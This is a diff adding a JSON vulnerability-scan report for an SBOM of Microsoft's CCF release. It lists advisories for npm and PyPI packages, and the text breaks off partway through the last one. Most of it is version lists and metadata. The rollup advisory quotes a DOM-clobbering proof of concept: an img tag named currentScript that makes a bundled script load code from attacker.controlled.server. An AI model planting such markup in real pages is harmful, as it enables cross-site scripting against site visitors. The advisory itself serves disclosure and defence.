@@ -1,0 +1,3317 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/home/ooe/sbom_scanning/v2/data_1727870904/sbom_files/microsoft_CCF_release_q6ei9qvo_manifest.spdx.json",
+        "type": "sbom"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "micromatch",
+            "version": "4.0.5",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-08-28T13:12:26Z",
+              "published": "2024-05-14T18:30:54Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-952p-6rrq-rcjv",
+              "aliases": [
+                "CVE-2024-4067"
+              ],
+              "related": [
+                "CGA-6q83-777j-gp5r",
+                "CGA-9qj8-ph43-6pq5"
+              ],
+              "summary": "Regular Expression Denial of Service (ReDoS) in micromatch",
+              "details": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "micromatch",
+                    "purl": "pkg:npm/micromatch"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.0.8"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-952p-6rrq-rcjv/GHSA-952p-6rrq-rcjv.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4067"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/issues/243"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/pull/247"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/pull/266"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://advisory.checkmarx.net/advisory/CVE-2024-4067"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4067"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/micromatch/micromatch"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/releases/tag/4.0.8"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-08-21T22:58:52Z",
+                "nvd_published_at": "2024-05-14T15:42:47Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-952p-6rrq-rcjv"
+              ],
+              "aliases": [
+                "CVE-2024-4067",
+                "GHSA-952p-6rrq-rcjv"
+              ],
+              "max_severity": "5.3"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "braces",
+            "version": "3.0.2",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-15T22:12:28Z",
+              "published": "2024-05-14T18:30:54Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-grv7-fg5c-xmjg",
+              "aliases": [
+                "CVE-2024-4068"
+              ],
+              "related": [
+                "CGA-g3x5-7mr7-wr8m",
+                "CGA-hq78-8245-675v",
+                "CGA-jrqh-c82g-rxvm",
+                "CGA-w95g-rrw2-66h4"
+              ],
+              "summary": "Uncontrolled resource consumption in braces",
+              "details": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "braces",
+                    "purl": "pkg:npm/braces"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.0.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-grv7-fg5c-xmjg/GHSA-grv7-fg5c-xmjg.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4068"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/issues/35"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/pull/37"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/pull/40"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4068"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/micromatch/braces"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1050",
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-10T20:17:26Z",
+                "nvd_published_at": "2024-05-14T15:42:48Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-grv7-fg5c-xmjg"
+              ],
+              "aliases": [
+                "CVE-2024-4068",
+                "GHSA-grv7-fg5c-xmjg"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "urllib3",
+            "version": "2.2.1",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-15T22:12:28Z",
+              "published": "2024-06-17T21:37:20Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-34jh-p97f-mpxf",
+              "aliases": [
+                "CVE-2024-37891"
+              ],
+              "related": [
+                "CGA-2vvm-h2g8-jrwc",
+                "CGA-32mf-hm7c-cqmg",
+                "CGA-37xg-qrch-w8h8",
+                "CGA-3ggr-w55x-hf5j",
+                "CGA-5v3j-934q-gj4m",
+                "CGA-64rf-gm8h-pg8g",
+                "CGA-688x-4mm6-g5vm",
+                "CGA-69g4-mv22-46cq",
+                "CGA-8f64-fgpv-jxj2",
+                "CGA-8hq8-2689-rc8h",
+                "CGA-cx62-9vw2-mmpq",
+                "CGA-grjq-jh3q-2p7g",
+                "CGA-gwpm-7fhq-3wh2",
+                "CGA-h28r-8q2c-xq96",
+                "CGA-j235-35vq-wrm8",
+                "CGA-jqq5-p5w5-hr5j",
+                "CGA-m9q6-p3c8-wp58",
+                "CGA-mrr8-97mj-749q",
+                "CGA-rqhm-766h-p289",
+                "CGA-vgvj-86h2-mvw3",
+                "CGA-vwcx-7fqm-jggq",
+                "CGA-w3h9-h7jv-6q22"
+              ],
+              "summary": "urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects ",
+              "details": "When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.\n\nHowever, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.\n\nBecause this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.\n\nUsers should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.\n* Not disabling HTTP redirects.\n* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.\n\n## Remediation\n\n* Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Proxy-Authorization` header.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "urllib3",
+                    "purl": "pkg:pypi/urllib3"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.26.19"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.2",
+                    "0.3",
+                    "0.3.1",
+                    "0.4.0",
+                    "0.4.1",
+                    "1.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.1",
+                    "1.10",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.10.4",
+                    "1.11",
+                    "1.12",
+                    "1.13",
+                    "1.13.1",
+                    "1.14",
+                    "1.15",
+                    "1.15.1",
+                    "1.16",
+                    "1.17",
+                    "1.18",
+                    "1.18.1",
+                    "1.19",
+                    "1.19.1",
+                    "1.2",
+                    "1.2.1",
+                    "1.2.2",
+                    "1.20",
+                    "1.21",
+                    "1.21.1",
+                    "1.22",
+                    "1.23",
+                    "1.24",
+                    "1.24.1",
+                    "1.24.2",
+                    "1.24.3",
+                    "1.25",
+                    "1.25.1",
+                    "1.25.10",
+                    "1.25.11",
+                    "1.25.2",
+                    "1.25.3",
+                    "1.25.4",
+                    "1.25.5",
+                    "1.25.6",
+                    "1.25.7",
+                    "1.25.8",
+                    "1.25.9",
+                    "1.26.0",
+                    "1.26.1",
+                    "1.26.10",
+                    "1.26.11",
+                    "1.26.12",
+                    "1.26.13",
+                    "1.26.14",
+                    "1.26.15",
+                    "1.26.16",
+                    "1.26.17",
+                    "1.26.18",
+                    "1.26.2",
+                    "1.26.3",
+                    "1.26.4",
+                    "1.26.5",
+                    "1.26.6",
+                    "1.26.7",
+                    "1.26.8",
+                    "1.26.9",
+                    "1.3",
+                    "1.4",
+                    "1.5",
+                    "1.6",
+                    "1.7",
+                    "1.7.1",
+                    "1.8",
+                    "1.8.2",
+                    "1.8.3",
+                    "1.9",
+                    "1.9.1"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-34jh-p97f-mpxf/GHSA-34jh-p97f-mpxf.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "urllib3",
+                    "purl": "pkg:pypi/urllib3"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.2.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "2.0.0",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.1.0",
+                    "2.2.0",
+                    "2.2.1"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-34jh-p97f-mpxf/GHSA-34jh-p97f-mpxf.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-37891"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/urllib3/urllib3"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-669"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-17T21:37:20Z",
+                "nvd_published_at": "2024-06-17T20:15:13Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-34jh-p97f-mpxf"
+              ],
+              "aliases": [
+                "CVE-2024-37891",
+                "GHSA-34jh-p97f-mpxf"
+              ],
+              "max_severity": "4.4"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "cryptography",
+            "version": "42.0.5",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-09-03T22:21:42Z",
+              "published": "2024-09-03T21:59:48Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-h4gh-qq45-vh27",
+              "related": [
+                "CGA-3fq7-h6cg-3j77",
+                "CGA-5rwc-frgf-pfq3",
+                "CGA-5vrc-gmm6-rrf4",
+                "CGA-6vrp-xf34-j7xv",
+                "CGA-8r5m-26r9-62wr",
+                "CGA-9cr2-xxqc-mvvr",
+                "CGA-f3ch-529w-gj3r",
+                "CGA-hpm7-m5wg-4f4h",
+                "CGA-wg7m-3865-q2g2",
+                "CGA-x72m-49rr-rrcp",
+                "CGA-xc57-m8vh-5mcg",
+                "CGA-xj8p-h7m3-2p9w"
+              ],
+              "summary": "pyca/cryptography has a vulnerable OpenSSL included in cryptography wheels",
+              "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 37.0.0-43.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20240903.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "cryptography",
+                    "purl": "pkg:pypi/cryptography"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "37.0.0"
+                        },
+                        {
+                          "fixed": "43.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "37.0.0",
+                    "37.0.1",
+                    "37.0.2",
+                    "37.0.3",
+                    "37.0.4",
+                    "38.0.0",
+                    "38.0.1",
+                    "38.0.2",
+                    "38.0.3",
+                    "38.0.4",
+                    "39.0.0",
+                    "39.0.1",
+                    "39.0.2",
+                    "40.0.0",
+                    "40.0.1",
+                    "40.0.2",
+                    "41.0.0",
+                    "41.0.1",
+                    "41.0.2",
+                    "41.0.3",
+                    "41.0.4",
+                    "41.0.5",
+                    "41.0.6",
+                    "41.0.7",
+                    "42.0.0",
+                    "42.0.1",
+                    "42.0.2",
+                    "42.0.3",
+                    "42.0.4",
+                    "42.0.5",
+                    "42.0.6",
+                    "42.0.7",
+                    "42.0.8",
+                    "43.0.0"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-h4gh-qq45-vh27/GHSA-h4gh-qq45-vh27.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-h4gh-qq45-vh27"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/pyca/cryptography"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://openssl-library.org/news/secadv/20240903.txt"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1395"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-09-03T21:59:48Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-h4gh-qq45-vh27"
+              ],
+              "aliases": [
+                "GHSA-h4gh-qq45-vh27"
+              ],
+              "max_severity": ""
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "requests",
+            "version": "2.31.0",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-15T22:12:27Z",
+              "published": "2024-05-20T20:15:00Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-9wx4-h78v-vm56",
+              "aliases": [
+                "CVE-2024-35195"
+              ],
+              "related": [
+                "CGA-2qh2-jp77-wp2x",
+                "CGA-32qh-xq5g-9xq4",
+                "CGA-432x-3phh-56c7",
+                "CGA-4354-v6cq-3f5f",
+                "CGA-4xx2-v3vc-q5x8",
+                "CGA-6rf6-59qq-87jc",
+                "CGA-6v4c-f9mw-8ghc",
+                "CGA-74xp-46xv-7q3v",
+                "CGA-77h5-pgh2-r2fg",
+                "CGA-8mx8-8v5r-99xg",
+                "CGA-fff7-969w-wcq5",
+                "CGA-hf9v-fwg4-2jvw",
+                "CGA-hhrg-5mf5-r2p5",
+                "CGA-jcgc-jpw2-xpqq",
+                "CGA-p79x-5pxg-f77m",
+                "CGA-phrh-j36c-pqjq",
+                "CGA-rrq3-6489-25cv",
+                "CGA-v263-vf6g-w8hh",
+                "CGA-v542-whj6-7mj4",
+                "CGA-whqq-jwxh-vf92",
+                "CGA-x395-8f45-7j43"
+              ],
+              "summary": "Requests `Session` object does not verify requests after making first request with verify=False",
+              "details": "When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.\n\n### Remediation\nAny of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.\n\n* Upgrade to `requests\u003e=2.32.0`.\n* For `requests\u003c2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session.\n* For `requests\u003c2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.\n\n### Related Links\n* https://github.com/psf/requests/pull/6655",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "requests",
+                    "purl": "pkg:pypi/requests"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.32.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.0.1",
+                    "0.10.0",
+                    "0.10.1",
+                    "0.10.2",
+                    "0.10.3",
+                    "0.10.4",
+                    "0.10.6",
+                    "0.10.7",
+                    "0.10.8",
+                    "0.11.1",
+                    "0.11.2",
+                    "0.12.0",
+                    "0.12.01",
+                    "0.12.1",
+                    "0.13.0",
+                    "0.13.1",
+                    "0.13.2",
+                    "0.13.3",
+                    "0.13.4",
+                    "0.13.5",
+                    "0.13.6",
+                    "0.13.7",
+                    "0.13.8",
+                    "0.13.9",
+                    "0.14.0",
+                    "0.14.1",
+                    "0.14.2",
+                    "0.2.0",
+                    "0.2.1",
+                    "0.2.2",
+                    "0.2.3",
+                    "0.2.4",
+                    "0.3.0",
+                    "0.3.1",
+                    "0.3.2",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.4.0",
+                    "0.4.1",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.6.0",
+                    "0.6.1",
+                    "0.6.2",
+                    "0.6.3",
+                    "0.6.4",
+                    "0.6.5",
+                    "0.6.6",
+                    "0.7.0",
+                    "0.7.1",
+                    "0.7.2",
+                    "0.7.3",
+                    "0.7.4",
+                    "0.7.5",
+                    "0.7.6",
+                    "0.8.0",
+                    "0.8.1",
+                    "0.8.2",
+                    "0.8.3",
+                    "0.8.4",
+                    "0.8.5",
+                    "0.8.6",
+                    "0.8.7",
+                    "0.8.8",
+                    "0.8.9",
+                    "0.9.0",
+                    "0.9.1",
+                    "0.9.2",
+                    "0.9.3",
+                    "1.0.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0.3",
+                    "1.0.4",
+                    "1.1.0",
+                    "1.2.0",
+                    "1.2.1",
+                    "1.2.2",
+                    "1.2.3",
+                    "2.0.0",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.10.0",
+                    "2.11.0",
+                    "2.11.1",
+                    "2.12.0",
+                    "2.12.1",
+                    "2.12.2",
+                    "2.12.3",
+                    "2.12.4",
+                    "2.12.5",
+                    "2.13.0",
+                    "2.14.0",
+                    "2.14.1",
+                    "2.14.2",
+                    "2.15.0",
+                    "2.15.1",
+                    "2.16.0",
+                    "2.16.1",
+                    "2.16.2",
+                    "2.16.3",
+                    "2.16.4",
+                    "2.16.5",
+                    "2.17.0",
+                    "2.17.1",
+                    "2.17.2",
+                    "2.17.3",
+                    "2.18.0",
+                    "2.18.1",
+                    "2.18.2",
+                    "2.18.3",
+                    "2.18.4",
+                    "2.19.0",
+                    "2.19.1",
+                    "2.2.0",
+                    "2.2.1",
+                    "2.20.0",
+                    "2.20.1",
+                    "2.21.0",
+                    "2.22.0",
+                    "2.23.0",
+                    "2.24.0",
+                    "2.25.0",
+                    "2.25.1",
+                    "2.26.0",
+                    "2.27.0",
+                    "2.27.1",
+                    "2.28.0",
+                    "2.28.1",
+                    "2.28.2",
+                    "2.29.0",
+                    "2.3.0",
+                    "2.30.0",
+                    "2.31.0",
+                    "2.4.0",
+                    "2.4.1",
+                    "2.4.2",
+                    "2.4.3",
+                    "2.5.0",
+                    "2.5.1",
+                    "2.5.2",
+                    "2.5.3",
+                    "2.6.0",
+                    "2.6.1",
+                    "2.6.2",
+                    "2.7.0",
+                    "2.8.0",
+                    "2.8.1",
+                    "2.9.0",
+                    "2.9.1",
+                    "2.9.2"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-9wx4-h78v-vm56/GHSA-9wx4-h78v-vm56.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35195"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/psf/requests/pull/6655"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/psf/requests"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IYLSNK5TL46Q6XPRVMHVWS63MVJQOK4Q"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/N7WP6EYDSUOCOJYHDK5NX43PYZ4SNHGZ"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-670"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-05-20T20:15:00Z",
+                "nvd_published_at": "2024-05-20T21:15:09Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-9wx4-h78v-vm56"
+              ],
+              "aliases": [
+                "CVE-2024-35195",
+                "GHSA-9wx4-h78v-vm56"
+              ],
+              "max_severity": "5.6"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "rollup",
+            "version": "2.79.1",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-09-26T21:11:53Z",
+              "published": "2024-09-23T22:11:02Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-gcx4-mw62-g8wm",
+              "aliases": [
+                "CVE-2024-47068"
+              ],
+              "summary": "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
+              "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript \u0026\u0026 False \u0026\u0026 _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n  \u003ctitle\u003erollup Example\u003c/title\u003e\n  \u003c!-- Attacker-controlled Script-less HTML Element starts--!\u003e\n  \u003cimg name=\"currentScript\" src=\"https://attacker.controlled.server/\"\u003e\u003c/img\u003e\n  \u003c!-- Attacker-controlled Script-less HTML Element ends--!\u003e\n\u003c/head\u003e\n\u003cscript type=\"module\" crossorigin src=\"bundle.js\"\u003e\u003c/script\u003e\n\u003cbody\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =\u003e\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript \u0026\u0026 document.currentScript.tagName.toUpperCase() === 'SCRIPT' \u0026\u0026 document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = 